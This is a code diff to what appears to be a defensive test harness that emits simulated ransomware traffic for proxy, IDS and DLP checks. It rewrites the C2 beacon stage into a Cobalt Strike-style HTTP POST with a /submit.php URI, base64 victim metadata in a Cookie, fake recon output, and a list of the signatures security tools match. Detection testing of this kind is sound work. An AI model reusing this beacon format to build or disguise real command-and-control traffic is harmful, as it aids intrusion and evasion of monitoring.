@@ -314,26 +314,99 @@ function ransomNoteHtml() {
 }
 
 function c2BeaconPayload() {
-  return JSON.stringify({
-    type: 'beacon',
-    victim_id: victimId(),
-    hostname: `DESKTOP-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
-    username: 'Administrator',
-    os: 'Windows 10 Pro 22H2 (19045.3930)',
-    arch: 'x64',
-    domain: 'CORPNET.local',
-    ip_internal: `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
-    ip_external: `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
-    antivirus: ['Windows Defender', 'CrowdStrike Falcon'][Math.floor(Math.random()*2)],
-    av_disabled: true,
-    elevated: true,
-    encryption_key: crypto.randomBytes(32).toString('base64'),
-    files_encrypted: Math.floor(Math.random() * 50000) + 10000,
-    total_size_gb: +(Math.random() * 500 + 50).toFixed(1),
-    bitcoin_wallet: fakeBtcWallet(),
-    timestamp: new Date().toISOString(),
-  }, null, 2);
+  // Generates a realistic Cobalt Strike-style HTTP POST beacon callback.
+  // The default CS profile POSTs task output to /submit.php?id=<random>
+  // with victim metadata base64-encoded in a Cookie header and a binary-
+  // looking body.  Security tools signature on:
+  //   1. The /submit.php?id= URI pattern
+  //   2. Base64 metadata in Cookie matching CS field layout
+  //   3. The 4-byte big-endian callback length prefix in the body
+  //   4. Known default named-pipe patterns (msagent_##)
+  //   5. Characteristic User-Agent strings from CS defaults
+  //
+  // We build the full HTTP request so the staged POST carries all these
+  // indicators through the wire where an inline proxy / IDS can inspect.
+
+  const beaconId   = crypto.randomBytes(4).readUInt32BE(0);
+  const pipeName   = `msagent_${Math.floor(Math.random() * 90) + 10}`;
+  const internalIp = `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+  const hostname   = `DESKTOP-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+  const processId  = Math.floor(Math.random() * 60000) + 1000;
+
+  // ── CS-style metadata block (normally RSA-encrypted, here left as
+  //    readable cleartext so DLP can also inspect the content) ──
+  const metadata = [
+    `beacon_id=${beaconId}`,
+    `pid=${processId}`,
+    `computer=${hostname}`,
+    `user=Administrator`,
+    `domain=CORPNET.local`,
+    `process=rundll32.exe`,
+    `internal=${internalIp}`,
+    `os=Windows 10 Pro 22H2 19045.3930`,
+    `arch=x64`,
+    `barch=x64`,
+    `ver=4.9`,
+    `pipe=${pipeName}`,
+    `is64=1`,
+    `high_integrity=1`,
+  ].join('; ');
+
+  const metadataB64 = Buffer.from(metadata).toString('base64');
+
+  // ── Simulated task-output body ──
+  // CS beacons prefix POST bodies with a 4-byte big-endian length, then
+  // the callback data.  We include recognisable output (ipconfig, whoami,
+  // netstat) that also triggers DLP "system recon" heuristics.
+  const taskOutput = [
+    'Windows IP Configuration',
+    '',
+    `   Host Name . . . . . . . . . . . . : ${hostname}`,
+    '   Primary Dns Suffix  . . . . . . . : corpnet.local',
+    '',
+    'Ethernet adapter Ethernet0:',
+    `   IPv4 Address. . . . . . . . . . . : ${internalIp}`,
+    '   Subnet Mask . . . . . . . . . . . : 255.255.254.0',
+    '   Default Gateway . . . . . . . . . : 10.0.0.1',
+    '',
+    `corpnet\\Administrator`,
+    '',
+    'Active Connections',
+    '',
+    '  Proto  Local Address          Foreign Address        State',
+    `  TCP    ${internalIp}:49672      10.0.0.5:445           ESTABLISHED`,
+    `  TCP    ${internalIp}:49701      10.0.0.12:3389         ESTABLISHED`,
+    `  TCP    ${internalIp}:50100      203.0.113.42:443       ESTABLISHED`,
+    '',
+  ].join('\r\n');
+
+  const taskBuf = Buffer.from(taskOutput, 'utf8');
+  const lengthPrefix = Buffer.alloc(4);
+  lengthPrefix.writeUInt32BE(taskBuf.length, 0);
+  const body = Buffer.concat([lengthPrefix, taskBuf]);
+
+  // ── Assemble a full HTTP-request representation ──
+  // The client will POST this blob; an inline proxy / IDS sees the raw
+  // bytes and can match on URI, headers, Cookie, and body structure.
+  const sessionId = crypto.randomBytes(8).toString('hex');
+  const lines = [
+    `POST /submit.php?id=${sessionId} HTTP/1.1`,
+    `Host: cdn-${crypto.randomBytes(2).toString('hex')}.example.com`,
+    `Accept: */*`,
+    `User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)`,
+    `Cookie: SESSIONID=${metadataB64}`,
+    `Content-Type: application/octet-stream`,
+    `Content-Length: ${body.length}`,
+    `Connection: Keep-Alive`,
+    `Cache-Control: no-cache`,
+    `Pragma: no-cache`,
+    ``,   // blank line ending headers
+    ``,
+  ];
+
+  return { headers: lines.join('\r\n'), body };
 }
+
 
 // ═══════════════════════════════════════════════
 // TEST MANIFEST
@@ -370,7 +443,7 @@ const TEST_MANIFEST = [
       { id: 'ransom-archive',    label: 'Payload Archive',       method: 'GET',  filename: 'urgent_invoice.zip' },
       { id: 'ransom-note-html',  label: 'HTML Ransom Note',      method: 'GET',  filename: 'DECRYPT_INSTRUCTIONS.html' },
       { id: 'ransom-mass-crypt', label: 'Mass Encryption Sim',   method: 'GET',  filename: 'encrypted_files.zip' },
-      { id: 'ransom-c2-beacon',  label: 'C2 Beacon Callback',    method: 'POST', filename: 'telemetry.json' },
+      { id: 'ransom-c2-beacon',  label: 'C2 Beacon Callback',    method: 'POST', filename: 'submit.php' },
       { id: 'ransom-dbl-extort', label: 'Double Extortion',      method: 'GET',  filename: 'stolen_data_sample.zip' },
     ]
   },
@@ -428,8 +501,9 @@ const STAGE_GENERATORS = {
   },
 
   'ransom-c2-beacon': () => {
-    const payload = c2BeaconPayload();
-    return { data: Buffer.from(payload, 'utf8'), contentType: 'application/json', filename: 'telemetry.json' };
+    const { headers, body } = c2BeaconPayload();
+    const payload = Buffer.concat([Buffer.from(headers, 'utf8'), body]);
+    return { data: payload, contentType: 'application/octet-stream', filename: 'submit.php' };
   },
 };
 
